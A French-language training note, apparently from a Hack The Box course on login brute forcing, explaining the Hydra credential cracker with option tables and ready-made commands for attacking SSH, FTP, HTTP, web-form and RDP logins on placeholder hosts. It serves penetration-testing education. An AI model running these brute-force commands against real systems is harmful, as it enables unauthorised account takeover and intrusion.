---
tags:
  - brute-force
ordre: 6
---

# Hydra

---

Hydra est un craqueur d'identifiants réseau rapide qui prend en charge de nombreux protocoles d'attaque. C'est un outil polyvalent qui peut effectuer des attaques par force brute (brute-force) sur un large éventail de services, y compris les applications web, les services de connexion à distance comme SSH et FTP, et même les bases de données.

La popularité d'Hydra découle de :

- `Rapidité et Efficacité` : Hydra utilise des connexions parallèles pour effectuer plusieurs tentatives de connexion simultanément, ce qui accélère considérablement le processus de craquage.
- `Flexibilité` : Hydra prend en charge de nombreux protocoles et services, ce qui le rend adaptable à divers scénarios d'attaque.
- `Facilité d'utilisation` : Hydra est relativement facile à utiliser malgré sa puissance, avec une interface en ligne de commande simple et une syntaxe claire.

### Installation

Hydra est souvent préinstallé sur les distributions populaires de tests d'intrusion (penetration testing). Vous pouvez vérifier sa présence en exécutant :

```bash
Hiterof13@htb[/htb]$ hydra -h
```

Si Hydra n'est pas installé ou si vous utilisez une autre distribution Linux, vous pouvez l'installer depuis le dépôt de paquets :

```bash
Hiterof13@htb[/htb]$ sudo apt-get -y update

Hiterof13@htb[/htb]$ sudo apt-get -y install hydra
```

## Utilisation de base

La syntaxe de base d'Hydra est la suivante :

```bash
Hiterof13@htb[/htb]$ hydra [login_options] [password_options] [attack_options] [service_options]
```

|Paramètre|Explication|Exemple d'utilisation|
|---|---|---|
|`-l LOGIN` ou `-L FILE`|Options de connexion : Spécifiez un nom d'utilisateur unique (`-l`) ou un fichier contenant une liste de noms d'utilisateur (`-L`).|`hydra -l admin ...` ou `hydra -L usernames.txt ...`|
|`-p PASS` ou `-P FILE`|Options de mot de passe : Fournissez un mot de passe unique (`-p`) ou un fichier contenant une liste de mots de passe (`-P`).|`hydra -p password123 ...` ou `hydra -P passwords.txt ...`|
|`-t TASKS`|Tâches : Définissez le nombre de tâches parallèles (threads) à exécuter, ce qui peut accélérer l'attaque.|`hydra -t 4 ...`|
|`-f`|Mode rapide : Arrête l'attaque après la découverte de la première connexion réussie.|`hydra -f ...`|
|`-s PORT`|Port : Spécifiez un port non standard pour le service cible.|`hydra -s 2222 ...`|
|`-v` ou `-V`|Sortie détaillée (verbose) : Affiche des informations détaillées sur la progression de l'attaque, y compris les tentatives et les résultats.|`hydra -v ...` ou `hydra -V ...` (pour encore plus de détails)|
|`service://server`|Cible : Spécifiez le service (ex. : `ssh`, `http`, `ftp`) et l'adresse ou le nom d'hôte du serveur cible.|`hydra ssh://192.168.1.100`|
|`/OPT`|Options spécifiques au service : Fournissez toute option supplémentaire requise par le service cible.|`hydra http-get://example.com/login.php -m "POST:user=^USER^&pass=^PASS^"` (pour l'authentification par formulaire HTTP)|

### Services Hydra

Les services Hydra définissent essentiellement les protocoles ou services spécifiques que Hydra peut cibler. Ils permettent à Hydra d'interagir avec les différents mécanismes d'authentification utilisés par divers systèmes, applications et services réseau. Chaque module est conçu pour comprendre les schémas de communication et les exigences d'authentification d'un protocole particulier, permettant à Hydra d'envoyer des requêtes de connexion appropriées et d'interpréter les réponses. Vous trouverez ci-dessous un tableau des services couramment utilisés :

|Service Hydra|Service/Protocole|Description|Exemple de commande|
|---|---|---|---|
|ftp|File Transfer Protocol (FTP)|Utilisé pour forcer par brute-force les identifiants de connexion pour les services FTP, couramment utilisés pour transférer des fichiers sur un réseau.|`hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`|
|ssh|Secure Shell (SSH)|Cible les services SSH pour forcer par brute-force les identifiants, couramment utilisés pour la connexion sécurisée à distance aux systèmes.|`hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`|
|http-get/post|Services Web HTTP|Utilisé pour forcer par brute-force les identifiants des formulaires de connexion web HTTP en utilisant des requêtes GET ou POST.|`hydra -l admin -P /path/to/password_list.txt http://192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`|
|smtp|Simple Mail Transfer Protocol|Attaque les serveurs de messagerie en forçant par brute-force les identifiants de connexion pour SMTP, couramment utilisé pour envoyer des e-mails.|`hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`|
|pop3|Post Office Protocol (POP3)|Cible les services de récupération d'e-mails pour forcer par brute-force les identifiants de connexion POP3.|`hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`|
|imap|Internet Message Access Protocol|Utilisé pour forcer par brute-force les identifiants des services IMAP, qui permettent aux utilisateurs d'accéder à leurs e-mails à distance.|`hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`|
|mysql|Base de données MySQL|Tente de forcer par brute-force les identifiants de connexion pour les bases de données MySQL.|`hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100`|
|mssql|Microsoft SQL Server|Cible les serveurs Microsoft SQL pour forcer par brute-force les identifiants de connexion à la base de données.|`hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`|
|vnc|Virtual Network Computing (VNC)|Force par brute-force les services VNC, utilisés pour l'accès au bureau à distance.|`hydra -P /path/to/password_list.txt vnc://192.168.1.100`|
|rdp|Remote Desktop Protocol (RDP)|Cible les services Microsoft RDP pour le forçage par brute-force de la connexion à distance.|`hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`|

### Forçage par brute-force d'une authentification HTTP

Imaginez que vous êtes chargé de tester la sécurité d'un site web utilisant une authentification HTTP de base à l'adresse `www.example.com`. Vous disposez d'une liste de noms d'utilisateur potentiels stockée dans `usernames.txt` et des mots de passe correspondants dans `passwords.txt`. Pour lancer une attaque par force brute contre ce service HTTP, utilisez la commande Hydra suivante :

```bash
Hiterof13@htb[/htb]$ hydra -L usernames.txt -P passwords.txt www.example.com http-get
```

Cette commande demande à Hydra de :

- Utiliser la liste de noms d'utilisateur du fichier `usernames.txt`.
- Utiliser la liste de mots de passe du fichier `passwords.txt`.
- Cibler le site web `www.example.com`.
- Utiliser le module `http-get` pour tester l'authentification HTTP.

Hydra essaiera systématiquement chaque combinaison nom d'utilisateur-mot de passe contre le site web cible pour découvrir un identifiant de connexion valide.

### Ciblage de plusieurs serveurs SSH

Envisagez une situation où vous avez identifié plusieurs serveurs qui pourraient être vulnérables aux attaques par force brute sur SSH. Vous compilez leurs adresses IP dans un fichier nommé `targets.txt` et vous savez que ces serveurs pourraient utiliser le nom d'utilisateur par défaut « root » et le mot de passe « toor ». Pour tester efficacement tous ces serveurs simultanément, utilisez la commande Hydra suivante :

```bash
Hiterof13@htb[/htb]$ hydra -l root -p toor -M targets.txt ssh
```

Cette commande demande à Hydra de :

- Utiliser le nom d'utilisateur « root ».
- Utiliser le mot de passe « toor ».
- Cibler toutes les adresses IP listées dans le fichier `targets.txt`.
- Utiliser le module `ssh` pour l'attaque.

Hydra exécutera des tentatives de force brute parallèles sur chaque serveur, accélérant considérablement le processus.

### Test d'identifiants FTP sur un port non standard

Imaginez que vous devez évaluer la sécurité d'un serveur FTP hébergé à `ftp.example.com`, qui fonctionne sur un port non standard `2121`. Vous avez des listes de noms d'utilisateur et de mots de passe potentiels stockées respectivement dans `usernames.txt` et `passwords.txt`. Pour tester ces identifiants contre le service FTP, utilisez la commande Hydra suivante :

```bash
Hiterof13@htb[/htb]$ hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```

Cette commande demande à Hydra de :

- Utiliser la liste de noms d'utilisateur du fichier `usernames.txt`.
- Utiliser la liste de mots de passe du fichier `passwords.txt`.
- Cibler le service FTP sur `ftp.example.com` via le port `2121`.
- Utiliser le module `ftp` et fournir une sortie détaillée (`-V`) pour un suivi détaillé.

Hydra tentera de faire correspondre chaque combinaison nom d'utilisateur-mot de passe avec le serveur FTP sur le port spécifié.

### Forçage par brute-force d'un formulaire de connexion web

Supposons que vous soyez chargé de forcer par brute-force un formulaire de connexion sur une application web à l'adresse `www.example.com`. Vous savez que le nom d'utilisateur est « admin » et que les paramètres du formulaire de connexion sont `user=^USER^&pass=^PASS^`. Pour effectuer cette attaque, utilisez la commande Hydra suivante :

```bash
Hiterof13@htb[/htb]$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

Cette commande demande à Hydra de :

- Utiliser le nom d'utilisateur « admin ».
- Utiliser la liste de mots de passe du fichier `passwords.txt`.
- Cibler le formulaire de connexion à l'adresse `/login` sur `www.example.com`.
- Utiliser le module `http-post-form` avec les paramètres de formulaire spécifiés.
- Rechercher une connexion réussie indiquée par le code de statut HTTP `302`.

Hydra tentera systématiquement chaque mot de passe pour le compte « admin », en vérifiant la condition de succès spécifiée.

### Forçage par brute-force avancé sur RDP

Maintenant, imaginez que vous testez un service RDP (Remote Desktop Protocol) sur un serveur avec l'IP `192.168.1.100`. Vous suspectez que le nom d'utilisateur est « administrator » et que le mot de passe est composé de 6 à 8 caractères, incluant des lettres minuscules, des lettres majuscules et des chiffres. Pour mener à bien cette attaque précise, utilisez la commande Hydra suivante :

```bash
Hiterof13@htb[/htb]$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

Cette commande demande à Hydra de :

- Utiliser le nom d'utilisateur « administrator ».
- Générer et tester des mots de passe d'une longueur de 6 à 8 caractères, en utilisant le jeu de caractères spécifié.
- Cibler le service RDP sur `192.168.1.100`.
- Utiliser le module `rdp` pour l'attaque.

Hydra générera et testera toutes les combinaisons de mots de passe possibles dans les paramètres spécifiés, en tentant de s'introduire dans le service RDP.
---

← [[05 - Attaques Hybrides]] | [[00 - Sommaire Login Brute Forcing|Sommaire]] | [[07 - Authentification HTTP de base]] →
